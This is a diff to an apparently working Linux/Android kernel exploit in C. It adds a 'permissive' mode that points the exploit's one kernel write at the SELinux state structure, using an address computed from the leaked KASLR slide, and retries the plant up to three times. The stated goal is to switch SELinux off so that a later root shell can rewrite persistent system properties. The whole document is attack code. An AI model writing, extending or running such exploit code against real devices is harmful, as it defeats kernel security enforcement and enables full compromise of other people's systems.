@@ -272,6 +272,7 @@ static int g_fake_stage;
 /* Dry run: capture the victim slab and prove reclaim, but never arm the
  * victim timer, so no stale rb_node is created and reaping is safe. */
 static int g_probe;
+static int g_selinux_target; /* single write goes to selinux_state */
 static unsigned long long g_child_task;
 static unsigned g_t_page_alloc, g_t_page_free;
 
@@ -1567,6 +1568,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
     }
     slab_pfn = pfn & ~((1ULL << SLAB_ORDER) - 1);
     g_slide = site0 - STATIC_TIMER_SITE;
+    if (g_selinux_target)
+        target = SELINUX_STATE_STATIC + g_slide - 7;
 
     {
         size_t off = (size_t)((V & SLAB_OFF_MASK) + 0x78);
@@ -2290,6 +2293,8 @@ int main(int argc, char **argv)
         shell_mode = 1;
     if (argc > 1 && !strcmp(argv[1], "leak"))
         leak_only = 1;
+    if (argc > 1 && !strcmp(argv[1], "permissive"))
+        g_selinux_target = 1;
     if (argc > 1 && !strcmp(argv[1], "ids"))
         ids_only = 1;
     if (argc > 1 && !strcmp(argv[1], "probe"))
@@ -2384,6 +2389,33 @@ int main(int argc, char **argv)
         write_ksu_script();
     ensure_pool();
     ensure_raw();
+
+    if (g_selinux_target)
+    {
+        /*
+         * SELinux is the only thing a uid-0 shell without capabilities
+         * cannot switch off through /sys/fs/selinux.  Clear the kernel's
+         * enforcing flag with one plant (fresh process, so this is the
+         * first write of the run), leaving a later uid-0 shell able to
+         * rewrite /data/property/persistent_properties.
+         */
+        struct plant_res r;
+
+        memset(&r, 0, sizeof(r));
+        for (int a = 0; a < 3 && !r.ok; a++)
+        {
+            logf("[+] permissive plant attempt %d/3\n", a + 1);
+            run_plant(0, 1, 0, &r, raw);
+        }
+        if (!r.ok)
+            park_forever("selinux write failed");
+        logf("[+] permissive done\n");
+        close(go_fd);
+        close(st_fd);
+        kill(C, SIGKILL);
+        waitpid(C, NULL, 0);
+        return 0;
+    }
 
     if (!g_fake_stage)
     {
